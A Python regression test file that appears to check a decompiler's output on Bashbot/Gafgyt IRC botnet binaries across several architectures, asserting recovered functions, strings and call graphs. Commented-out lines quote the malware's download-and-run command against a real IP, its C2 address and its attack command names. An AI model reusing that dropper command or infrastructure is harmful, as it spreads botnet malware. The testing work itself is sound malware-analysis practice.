"""Tests for the Bashbot (IRC bot)."""

from regression_tests import *

if not on_macos():
    class BashbotTest(Test):
        setting = TestSettings(
            input=[
                'bashbot.arm.gcc.O0.elf', 'bashbot.arm.gcc.O2.elf', 'bashbot.arm.gcc.O3.elf', # TODO: 'bashbot.arm.gcc.O1.elf'
                'bashbot.ppc.gcc.O0.elf', 'bashbot.ppc.gcc.O2.elf', 'bashbot.ppc.gcc.O3.elf', # TODO: 'bashbot.ppc.gcc.O1.elf'
                'bashbot.thumb.gcc.O0.elf', 'bashbot.thumb.gcc.O1.elf', 'bashbot.thumb.gcc.O2.elf', 'bashbot.thumb.gcc.O3.elf',
                'bashbot.x86.gcc.O0.elf', 'bashbot.x86.gcc.O1.elf', 'bashbot.x86.gcc.O2.elf', 'bashbot.x86.gcc.O3.elf',
            ],
            args='-k'
        )

        # Check presence of all functions.
        #
        def test_has_all_functions(self):
            assert self.out_c.has_func( 'init_rand' )
            assert self.out_c.has_func( 'rand_cmwc' )
            assert self.out_c.has_func( 'trim' )
            #assert self.out_c.has_func( 'printchar' ) #thumb O3
            assert self.out_c.has_func( 'prints' )
            assert self.out_c.has_func( 'printi' )
            assert self.out_c.has_func( 'print' )
            assert self.out_c.has_func( 'zprintf' )
            assert self.out_c.has_func( 'szprintf' )
            assert self.out_c.has_func( 'sockprintf' )
            assert self.out_c.has_func( 'fdpopen' )
            assert self.out_c.has_func( 'fdpclose' )
            assert self.out_c.has_func( 'fdgets' )
            assert self.out_c.has_func( 'parseHex' )
            assert self.out_c.has_func( 'wildString' )
            assert self.out_c.has_func( 'getHost' )
            assert self.out_c.has_func( 'uppercase' )
            assert self.out_c.has_func( 'getBogos' )
            assert self.out_c.has_func( 'getCores' )
            assert self.out_c.has_func( 'makeRandomStr' )
            assert self.out_c.has_func( 'recvLine' )
            assert self.out_c.has_func( 'connectTimeout' )
            assert self.out_c.has_func( 'listFork' )
            assert self.out_c.has_func( 'negotiate' )
            assert self.out_c.has_func( 'matchPrompt' )
            assert self.out_c.has_func( 'readUntil' )
            assert self.out_c.has_func( 'getRandomPublicIP' )
            assert self.out_c.has_func( 'getRandomIP' )
            assert self.out_c.has_func( 'csum' )
            assert self.out_c.has_func( 'tcpcsum' )
            assert self.out_c.has_func( 'makeIPPacket' )
            assert self.out_c.has_func( 'sclose' )
            assert self.out_c.has_func( 'StartTheLelz' )
            assert self.out_c.has_func( 'sendUDP' )
            assert self.out_c.has_func( 'sendTCP' )
            assert self.out_c.has_func( 'sendJUNK' )
            assert self.out_c.has_func( 'sendHOLD' )
            assert self.out_c.has_func( 'processCmd' )
            assert self.out_c.has_func( 'initConnection' )
            assert self.out_c.has_func( 'getOurIP' )
            assert self.out_c.has_func( 'main' )

        # Check some of the referred strings
        #
        def test_check_for_currently_detected_strings(self):
            assert self.out_c.has_string_literal( '/bin/sh' )
            assert self.out_c.has_string_literal( '/proc/cpuinfo' )
            assert self.out_c.has_string_literal( '/proc/net/route' )
            assert self.out_c.has_string_literal( '[cpuset]' )
            assert self.out_c.has_string_literal( '\\t00000000\\t' )
            assert self.out_c.has_string_literal( '8.8.8.8' )
            assert self.out_c.has_string_literal( 'BOGOMIPS' )
            assert self.out_c.has_string_literal( 'buf: %s\\n' )
            assert self.out_c.has_string_literal( 'GETLOCALIP' )
            #assert self.out_c.has_string_literal( 'LINK CLOSED' )
            assert self.out_c.has_string_literal( 'PING' )
            #assert self.out_c.has_string_literal( 'PONG!' )
            assert self.out_c.has_string_literal( 'sh' )

            # jk: the following strings are not detected on all architectures at the same time.
            #assert self.out_c.has_string_literal( '%d.%d.%d.%d' ) #x86
            #assert self.out_c.has_string_literal( '%s 2>&1' ) #x86
            #assert self.out_c.has_string_literal( '(null)' ) #x86
            #assert self.out_c.has_string_literal( '/bin/busybox;echo -e \'gayfgt\'\\r\\n' ) #PPC
            #assert self.out_c.has_string_literal( ':>%$#' )
            #assert self.out_c.has_string_literal( '188.209.52.143:8080' ) #x86
            #assert self.out_c.has_string_literal( 'all' ) #x86
            #assert self.out_c.has_string_literal( 'assword:' ) #PPC
            #assert self.out_c.has_string_literal( '-c' ) #x86
            #assert self.out_c.has_string_literal( 'DUP' ) #ARM
            #assert self.out_c.has_string_literal( 'Failed opening raw socket.' ) #arm
            #assert self.out_c.has_string_literal( 'Failed setting raw headers mode.' ) #arm
            #assert self.out_c.has_string_literal( 'FAILED TO CONNECT' ) #arm
            #assert self.out_c.has_string_literal( 'FORK' ) #PPC
            #assert self.out_c.has_string_literal( 'gayfgt' ) #PPC
            #assert self.out_c.has_string_literal( 'HOLD' ) # PPC
            #assert self.out_c.has_string_literal( 'Invalid flag \\"%s\\"' ) #arm
            #assert self.out_c.has_string_literal( 'JUNK' ) #PPC
            #assert self.out_c.has_string_literal( 'KILLATTK' ) #PPC
            #assert self.out_c.has_string_literal( 'Killed %d.' ) #x86
            #assert self.out_c.has_string_literal( 'LOLNOGTFO' ) #arm
            #assert self.out_c.has_string_literal( 'My IP: %s' ) #PPC
            #assert self.out_c.has_string_literal( 'ncorrect' ) #thumb
            #assert self.out_c.has_string_literal( 'None Killed.' ) #arm
            #assert self.out_c.has_string_literal( 'OFF' ) #x86
            #assert self.out_c.has_string_literal( 'ogin:' ) #arm
            #assert self.out_c.has_string_literal( 'ON' ) #x86
            #assert self.out_c.has_string_literal( 'REPORT %s:%s:%s' ) #PPC
            #assert self.out_c.has_string_literal( 'SCANNER' ) #arm
            #assert self.out_c.has_string_literal( 'SCANNER ON | OFF' ) #x86
            #assert self.out_c.has_string_literal( 'sh\\r\\n' ) #thumb
            #assert self.out_c.has_string_literal( 'shell\\r\\n' ) #thum
            #assert self.out_c.has_string_literal( 'ulti-call' ) #arm
            #assert self.out_c.has_string_literal( 'wget http://188.209.52.143/gb.sh -O /tmp/gb.sh && sh /tmp/gb.sh && rm /tmp/gb.sh\\r\\n' ) #x86

        # Check function calls
        #
        def test_check_callgraph(self):
            fnc = self.out_c.funcs[ 'trim' ]
            #assert fnc.calls( 'strlen' ) or fnc.calls( '_strlen' )

            #fnc = self.out_c.funcs[ 'printchar' ] #thumb O3
            #assert fnc.calls( 'write' )

            fnc = self.out_c.funcs[ 'prints' ]
            #assert fnc.calls( 'printchar' ) #thumb O3

            fnc = self.out_c.funcs[ 'printi' ]
            #assert fnc.calls( 'printchar' ) #x86
            assert fnc.calls( 'prints' )

            fnc = self.out_c.funcs[ 'print' ]
            #assert fnc.calls( 'printchar' ) #thumb O3
            assert fnc.calls( 'printi' )
            assert fnc.calls( 'prints' )

            fnc = self.out_c.funcs[ 'zprintf' ]
            assert fnc.calls( 'print' )

            fnc = self.out_c.funcs[ 'szprintf' ]
            assert fnc.calls( 'print' )

            fnc = self.out_c.funcs[ 'sockprintf' ]
            assert fnc.calls( 'free' )
            assert fnc.calls( 'malloc' )
            assert fnc.calls( 'memset' ) or fnc.calls( '__asm_rep_stosd_memset' )
            assert fnc.calls( 'print' )
            #assert fnc.calls( 'send' ) #probably some error in our C parser on Windows
            assert fnc.calls( 'zprintf' )

            fnc = self.out_c.funcs[ 'fdpopen' ]
            assert fnc.calls( 'close' )
            assert fnc.calls( 'dup2' )
            assert fnc.calls( 'execl' )
            #assert fnc.calls( 'exit' ) #PPC
            assert fnc.calls( 'getdtablesize' )
            assert fnc.calls( 'malloc' )
            assert fnc.calls( 'memset' )
            assert fnc.calls( 'pipe' )
            assert fnc.calls( 'vfork' )

            fnc = self.out_c.funcs[ 'fdpclose' ]
            assert fnc.calls( 'close' )
            assert on_macos() or fnc.calls( 'sigaddset' )
            assert on_macos() or fnc.calls( 'sigemptyset' )
            #assert fnc.calls( 'sigprocmask' ) #PPC
            assert fnc.calls( 'waitpid' )

            fnc = self.out_c.funcs[ 'fdgets' ]
            #assert fnc.calls( 'read' ) #PPC

            fnc = self.out_c.funcs[ 'wildString' ]
            assert fnc.calls( 'wildString' )

            fnc = self.out_c.funcs[ 'getHost' ]
            # call is there, but we are not able to detect it at the moment
            #assert (fnc.calls( 'inet_addr' ) or self.out_c.contains('\= inet_addr\(cp\)'))

            fnc = self.out_c.funcs[ 'getBogos' ]
            assert fnc.calls( 'close' )
            #assert fnc.calls( 'fdgets' ) #thumb O3
            #assert fnc.calls( 'memset' ) or fnc.calls( '_memset' )
            assert fnc.calls( 'open' )
            #assert fnc.calls( 'strcpy' ) #x86 O3
            assert fnc.calls( 'strstr' )
            #assert fnc.calls( 'uppercase' ) #thumb O3

            fnc = self.out_c.funcs[ 'getCores' ]
            #assert fnc.calls( 'close' ) #PPC
            #assert fnc.calls( 'fdgets' ) #thumb O3
            assert fnc.calls( 'memset' ) or fnc.calls( '__asm_rep_stosd_memset' )
            assert fnc.calls( 'open' )
            assert fnc.calls( 'strstr' )
            #assert fnc.calls( 'uppercase' ) #thumb O3

            fnc = self.out_c.funcs[ 'makeRandomStr' ]
            #assert fnc.calls( 'rand_cmwc' ) #thumb O3

            fnc = self.out_c.funcs[ 'recvLine' ]
            assert fnc.calls( 'memset' ) or fnc.calls( '_memset' )
            #assert fnc.calls( 'recv' ) #thumb
            #assert fnc.calls( 'select' ) #thumb
            #assert fnc.calls( 'sockprintf' ) #thumb

            fnc = self.out_c.funcs[ 'connectTimeout' ]
            #assert fnc.calls( 'connect' )
            #assert fnc.calls( 'fcntl' ) #x86 - probably some error in our C parser
            #assert fnc.calls( 'getHost' ) #arm
            #assert fnc.calls( 'getsockopt' ) #x86 - probably some error in our C parser
            #assert fnc.calls( 'memset' ) #x86 - probably some error in our C parser
            #assert fnc.calls( 'select' ) #x86 - probably some error in our C parser

            fnc = self.out_c.funcs[ 'listFork' ]
            assert fnc.calls( 'fork' )
            assert fnc.calls( 'free' )
            assert fnc.calls( 'malloc' )

            fnc = self.out_c.funcs[ 'negotiate' ]
            #assert fnc.calls( 'send' ) #arm

            fnc = self.out_c.funcs[ 'matchPrompt' ]
            #assert fnc.calls( 'strlen' ) or fnc.calls( '_strlen' )

            fnc = self.out_c.funcs[ 'readUntil' ]
            #assert fnc.calls( 'negotiate' ) #x86
            #assert fnc.calls( 'recv' ) #thumb O3
            #assert fnc.calls( 'select' ) #thumb O3
            #assert fnc.calls( 'strstr' ) #thumb O3

            fnc = self.out_c.funcs[ 'getRandomPublicIP' ]
            #assert fnc.calls( 'inet_addr' ) #x86 - probably some error in our C parser
            assert fnc.calls( 'rand' )
            assert fnc.calls( 'szprintf' )

            fnc = self.out_c.funcs[ 'getRandomIP' ]
            #assert fnc.calls( 'rand_cmwc' ) #thumb O3

            fnc = self.out_c.funcs[ 'tcpcsum' ]
            #assert fnc.calls( 'csum' ) #thumb O3
            assert fnc.calls( 'free' )
            assert fnc.calls( 'malloc' )
            #assert fnc.calls( 'memcpy' ) #x86

            fnc = self.out_c.funcs[ 'makeIPPacket' ]
            #assert fnc.calls( 'rand_cmwc' ) #arm

            fnc = self.out_c.funcs[ 'sclose' ]
            #assert fnc.calls( 'close' ) #arm

            fnc = self.out_c.funcs[ 'StartTheLelz' ]
            #assert fnc.calls( 'connect' ) #arm
            #assert fnc.calls( 'fcntl' ) #x86 - probably some error in our C parser
            #assert fnc.calls( 'getdtablesize' ) #thumb
            #assert fnc.calls( 'getRandomPublicIP' ) #thumb
            #assert fnc.calls( 'inet_ntoa' ) #arm
            assert fnc.calls( 'memset' ) or fnc.calls( '__asm_rep_stosd_memset' )
            #assert fnc.calls( 'readUntil' ) #arm
            #assert fnc.calls( 'sclose' ) #arm
            #assert fnc.calls( 'select' ) #arm
            #assert fnc.calls( 'send' ) #thumb
            #assert fnc.calls( 'setsockopt' ) #arm
            #assert fnc.calls( 'sockprintf' ) #arm
            #assert fnc.calls( 'strlen' ) #thumb
            #assert fnc.calls( 'strstr' ) #arm
            #assert fnc.calls( 'time' ) #thumb

            fnc = self.out_c.funcs[ 'sendUDP' ]
            #assert fnc.calls( 'csum' ) #x86
            #assert fnc.calls( 'getHost' ) #arm
            #assert fnc.calls( 'getRandomIP' ) #x86
            #assert fnc.calls( 'init_rand' ) #x86
            #assert fnc.calls( 'makeIPPacket' ) #x86
            #assert fnc.calls( 'makeRandomStr' ) #arm
            #assert fnc.calls( 'malloc' ) #arm
            #assert fnc.calls( 'memset' ) #x86
            #assert fnc.calls( 'rand_cmwc' ) #thumb O3
            #assert fnc.calls( 'sendto' ) #x86
            #assert fnc.calls( 'setsockopt' ) #arm
            #assert fnc.calls( 'socket' ) #arm
            #assert fnc.calls( 'sockprintf' ) #arm
            #assert fnc.calls( 'srand' ) #x86
            #assert fnc.calls( 'time' ) #arm

            fnc = self.out_c.funcs[ 'sendTCP' ]
            #assert fnc.calls( 'csum' ) #arm
            #assert fnc.calls( 'getHost' ) #arm
            #assert fnc.calls( 'getRandomIP' ) #arm
            #assert fnc.calls( 'makeIPPacket' ) #arm
            #assert fnc.calls( 'memset' ) #x86
            #assert fnc.calls( 'rand_cmwc' ) #thumb O3
            #assert fnc.calls( 'sendto' ) #arm
            #assert fnc.calls( 'setsockopt' ) #arm
            #assert fnc.calls( 'socket' ) #arm
            #assert fnc.calls( 'sockprintf' ) #arm
            #assert fnc.calls( 'strcmp' ) #x86
            #assert fnc.calls( 'strtok' ) #arm
            #assert fnc.calls( 'tcpcsum' ) #arm
            #assert fnc.calls( 'time' ) #arm

            fnc = self.out_c.funcs[ 'sendJUNK' ]
            #assert fnc.calls( 'close' ) #arm
            #assert fnc.calls( 'connect' ) #arm
            #assert fnc.calls( 'fcntl' ) #x86 - probably some error in our C parser
            assert fnc.calls( 'getdtablesize' )
            #assert fnc.calls( 'getHost' ) #arm
            #assert fnc.calls( 'getsockopt' ) #arm
            #assert fnc.calls( 'makeRandomStr' ) #arm
            #assert fnc.calls( 'malloc' ) #arm
            #assert fnc.calls( 'memset' ) #arm
            #assert fnc.calls( 'select' ) #arm
            #assert fnc.calls( 'send' ) #arm
            #assert fnc.calls( 'socket' ) #arm
            #assert fnc.calls( 'time' ) #arm

            fnc = self.out_c.funcs[ 'sendHOLD' ]
            #assert fnc.calls( 'close' ) #arm
            #assert fnc.calls( 'connect' ) #arm
            #assert fnc.calls( 'fcntl' ) #x86 - probably some error in our C parser
            assert fnc.calls( 'getdtablesize' )
            #assert fnc.calls( 'getHost' ) #arm
            #assert fnc.calls( 'getsockopt' ) #arm
            #assert fnc.calls( 'malloc' ) #arm
            #assert fnc.calls( 'memset' ) #arm
            #assert fnc.calls( 'select' ) #arm
            #assert fnc.calls( 'socket' ) #arm

            fnc = self.out_c.funcs[ 'processCmd' ]
            #assert fnc.calls( 'close' ) #arm
            #assert fnc.calls( 'exit' ) #arm
            #assert fnc.calls( 'fork' ) #arm
            #assert fnc.calls( 'kill' ) #x86 - probably some error in our C parser
            #assert fnc.calls( 'listFork' ) #arm
            #assert fnc.calls( 'sendHOLD' ) #arm
            #assert fnc.calls( 'sendJUNK' ) #arm
            #assert fnc.calls( 'sendTCP' ) #arm
            #assert fnc.calls( 'sendUDP' ) #arm
            #assert fnc.calls( 'sockprintf' ) #thumb O3
            #assert fnc.calls( 'StartTheLelz' ) #arm
            assert fnc.calls( 'strcmp' )
            #assert fnc.calls( 'strstr' ) #x86
            #assert fnc.calls( 'strtok' ) #arm

            fnc = self.out_c.funcs[ 'initConnection' ]
            assert fnc.calls( 'close' )
            #assert fnc.calls( 'connectTimeout' ) #thumb O3
            assert fnc.calls( 'memset' ) or fnc.calls( '__asm_rep_stosd_memset' )
            #assert fnc.calls( 'socket' ) #probably some error in our C parser on Windows
            assert on_macos() or fnc.calls( 'strcpy' )
            assert fnc.calls( 'strchr' )

            fnc = self.out_c.funcs[ 'getOurIP' ]
            assert fnc.calls( 'close' )
            assert fnc.calls( 'connect' )
            #assert fnc.calls( 'fdgets' ) #thumb O3
            assert fnc.calls( 'getsockname' )
            assert fnc.calls( 'inet_addr' )
            #assert fnc.calls( 'ioctl' ) #arm
            #assert fnc.calls( 'memset' ) #PPC
            #assert fnc.calls( 'open' ) #thumb 03 - probably some error in our C parser
            #assert fnc.calls( 'socket' ) #probably some error in our C parser on Windows
            #assert fnc.calls( 'strcpy' ) #arm
            assert fnc.calls( 'strstr' )

            fnc = self.out_c.funcs[ 'main' ]
            assert fnc.calls( 'exit' )
            #assert fnc.calls( 'fdgets' ) #x86 - probably some error in our C parser
            #assert fnc.calls( 'fdpclose' ) #x86 - probably some error in our C parser
            #assert fnc.calls( 'fdpopen' ) #x86 - probably some error in our C parser
            assert fnc.calls( 'fork' )
            #assert fnc.calls( 'free' ) #arm
            assert fnc.calls( 'getpid' )
            assert fnc.calls( 'chdir' )
            #assert fnc.calls( 'init_rand' ) #thumb O3
            assert fnc.calls( 'initConnection' )
            #assert fnc.calls( 'listFork' ) #x86 - probably some error in our C parser
            #assert fnc.calls( 'malloc' ) #arm
            #assert fnc.calls( 'memset' ) #x86
            #assert fnc.calls( 'prctl' ) #probably some error in our C parser on Windows
            #assert fnc.calls( 'printf' ) #x86
            #assert fnc.calls( 'processCmd' ) #x86
            assert fnc.calls( 'puts' )
            #assert fnc.calls( 'recvLine' ) #thumb O3
            assert fnc.calls( 'setsid' )
            #assert fnc.calls( 'signal' ) #x86 - probably some error in our C parser
            #assert fnc.calls( 'sleep' ) #arm
            #assert fnc.calls( 'sockprintf' ) #arm
            assert fnc.calls( 'srand' )
            #assert fnc.calls( 'strcmp' ) #x86 - probably some error in our C parser
            #assert fnc.calls( 'strcpy' ) #x86
            #assert fnc.calls( 'strlen' ) #x86
            #assert fnc.calls( 'strstr' ) #arm
            #assert fnc.calls( 'strtok' ) #x86
            assert fnc.calls( 'time' )
            #assert fnc.calls( 'toupper' ) #x86
            #assert fnc.calls( 'trim' ) #arm
            assert fnc.calls( 'waitpid' )
            #assert fnc.calls( 'zprintf' ) #x86
